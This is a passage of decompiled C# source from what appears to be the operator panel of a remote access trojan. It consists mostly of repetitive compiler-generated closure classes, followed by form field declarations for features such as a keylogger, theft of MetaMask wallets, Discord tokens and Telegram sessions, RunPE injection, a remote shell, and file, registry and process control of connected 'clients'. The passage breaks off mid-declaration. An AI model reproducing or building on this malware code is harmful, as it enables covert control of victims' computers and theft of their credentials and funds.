			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R839_002D80
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R839_002D80(_Closure_0024__R839_002D80 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R82(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R840_002D82
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R840_002D82(_Closure_0024__R840_002D82 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R84(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R841_002D84
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R841_002D84(_Closure_0024__R841_002D84 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R86(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R842_002D86
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R842_002D86(_Closure_0024__R842_002D86 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R88(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R843_002D88
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R843_002D88(_Closure_0024__R843_002D88 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R90(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R844_002D90
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R844_002D90(_Closure_0024__R844_002D90 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R92(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R845_002D92
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R845_002D92(_Closure_0024__R845_002D92 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R94(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R846_002D94
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R846_002D94(_Closure_0024__R846_002D94 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R96(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R847_002D96
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R847_002D96(_Closure_0024__R847_002D96 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R98(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R848_002D98
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R848_002D98(_Closure_0024__R848_002D98 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R100(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R849_002D100
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R849_002D100(_Closure_0024__R849_002D100 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R102(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R850_002D102
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R850_002D102(_Closure_0024__R850_002D102 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R104(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R851_002D104
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R851_002D104(_Closure_0024__R851_002D104 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R106(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R852_002D106
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R852_002D106(_Closure_0024__R852_002D106 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R108(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R853_002D108
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R853_002D108(_Closure_0024__R853_002D108 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R110(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R854_002D110
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R854_002D110(_Closure_0024__R854_002D110 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R112(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R855_002D112
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R855_002D112(_Closure_0024__R855_002D112 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R114(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R856_002D114
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R856_002D114(_Closure_0024__R856_002D114 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R116(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R857_002D116
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R857_002D116(_Closure_0024__R857_002D116 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R118(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R858_002D118
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R858_002D118(_Closure_0024__R858_002D118 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R120(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R859_002D120
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R859_002D120(_Closure_0024__R859_002D120 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R122(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R860_002D122
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R860_002D122(_Closure_0024__R860_002D122 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R124(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R861_002D124
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R861_002D124(_Closure_0024__R861_002D124 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R126(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R862_002D126
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R862_002D126(_Closure_0024__R862_002D126 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R128(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R863_002D128
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R863_002D128(_Closure_0024__R863_002D128 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R130(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R864_002D130
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R864_002D130(_Closure_0024__R864_002D130 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R132(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R865_002D132
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R865_002D132(_Closure_0024__R865_002D132 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R134(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R867_002D134
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R867_002D134(_Closure_0024__R867_002D134 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R136(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R869_002D138
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R869_002D138(_Closure_0024__R869_002D138 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R140(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R871_002D142
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R871_002D142(_Closure_0024__R871_002D142 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R144(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R872_002D144
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R872_002D144(_Closure_0024__R872_002D144 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R146(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R873_002D146
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R873_002D146(_Closure_0024__R873_002D146 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R148(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R874_002D148
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R874_002D148(_Closure_0024__R874_002D148 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R150(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R875_002D150
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R875_002D150(_Closure_0024__R875_002D150 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R152(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R876_002D152
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R876_002D152(_Closure_0024__R876_002D152 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R154(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R880_002D154
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R880_002D154(_Closure_0024__R880_002D154 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R156(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R881_002D156
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R881_002D156(_Closure_0024__R881_002D156 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R158(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R883_002D158
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R883_002D158(_Closure_0024__R883_002D158 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R160(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R885_002D160
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R885_002D160(_Closure_0024__R885_002D160 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R162(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R886_002D162
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R886_002D162(_Closure_0024__R886_002D162 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R164(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R887_002D164
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R887_002D164(_Closure_0024__R887_002D164 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R166(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R889_002D166
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R889_002D166(_Closure_0024__R889_002D166 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R168(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R890_002D168
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R890_002D168(_Closure_0024__R890_002D168 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R170(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer_Ping")]
	private System.Windows.Forms.Timer _Timer_Ping;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer_Status")]
	private System.Windows.Forms.Timer _Timer_Status;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("NotifyIcon1")]
	private NotifyIcon _NotifyIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Lv1")]
	private GListView0 _Lv1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TimerTask")]
	private System.Windows.Forms.Timer _TimerTask;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ThumbnailCap")]
	private System.Windows.Forms.Timer _ThumbnailCap;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Lv4")]
	private ListView _Lv4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2Button5")]
	private Guna2Button _Guna2Button5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2Button4")]
	private Guna2Button _Guna2Button4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2Button3")]
	private Guna2Button _Guna2Button3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2Button2")]
	private Guna2Button _Guna2Button2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2Button1")]
	private Guna2Button _Guna2Button1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2TextBox1")]
	private Guna2TextBox _Guna2TextBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ShowToolStripMenuItem")]
	private ToolStripMenuItem _ShowToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RestartToolStripMenuItem1")]
	private ToolStripMenuItem _RestartToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ExitToolStripMenuItem")]
	private ToolStripMenuItem _ExitToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem4")]
	private ToolStripMenuItem _ToolStripMenuItem4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem6")]
	private ToolStripMenuItem _ToolStripMenuItem6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem7")]
	private ToolStripMenuItem _ToolStripMenuItem7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2Button6")]
	private Guna2Button _Guna2Button6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2Button7")]
	private Guna2Button _Guna2Button7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("KeyloggerToolStripMenuItem")]
	private ToolStripMenuItem _KeyloggerToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("VisibleToolStripMenuItem2")]
	private ToolStripMenuItem _VisibleToolStripMenuItem2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("InvisibleToolStripMenuItem2")]
	private ToolStripMenuItem _InvisibleToolStripMenuItem2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("MetaMaskToolStripMenuItem2")]
	private ToolStripMenuItem _MetaMaskToolStripMenuItem2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DiscordTokenToolStripMenuItem1")]
	private ToolStripMenuItem _DiscordTokenToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TelegramSessionToolStripMenuItem1")]
	private ToolStripMenuItem _TelegramSessionToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FromDiskToolStripMenuItem")]
	private ToolStripMenuItem _FromDiskToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FromLinkToolStripMenuItem")]
	private ToolStripMenuItem _FromLinkToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FromMemoryToolStripMenuItem1")]
	private ToolStripMenuItem _FromMemoryToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UpdateAllClientsToolStripMenuItem1")]
	private ToolStripMenuItem _UpdateAllClientsToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RemoveTaskToolStripMenuItem1")]
	private ToolStripMenuItem _RemoveTaskToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("InformationToolStripMenuItem1")]
	private ToolStripMenuItem _InformationToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DiskToolStripMenuItem")]
	private ToolStripMenuItem _DiskToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("LinkToolStripMenuItem")]
	private ToolStripMenuItem _LinkToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("MemoryToolStripMenuItem1")]
	private ToolStripMenuItem _MemoryToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RunPEToolStripMenuItem2")]
	private ToolStripMenuItem _RunPEToolStripMenuItem2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("VisibleToolStripMenuItem1")]
	private ToolStripMenuItem _VisibleToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("InvisibleToolStripMenuItem1")]
	private ToolStripMenuItem _InvisibleToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ShellToolStripMenuItem")]
	private ToolStripMenuItem _ShellToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FileManagerToolStripMenuItem1")]
	private ToolStripMenuItem _FileManagerToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RegistryEditorToolStripMenuItem1")]
	private ToolStripMenuItem _RegistryEditorToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TCPConnectionsToolStripMenuItem")]
	private ToolStripMenuItem _TCPConnectionsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ActiveWindowsToolStripMenuItem1")]
	private ToolStripMenuItem _ActiveWindowsToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("StartupManagerToolStripMenuItem1")]
	private ToolStripMenuItem _StartupManagerToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ProcessManagerToolStripMenuItem1")]
	private ToolStripMenuItem _ProcessManagerToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ServiceManagerToolStripMenuItem1")]
	private ToolStripMenuItem _ServiceManagerToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClipboardManagerToolStripMenuItem1")]
	private ToolStripMenuItem _ClipboardManagerToolStripMenuItem1;

	[CompilerGenerated]
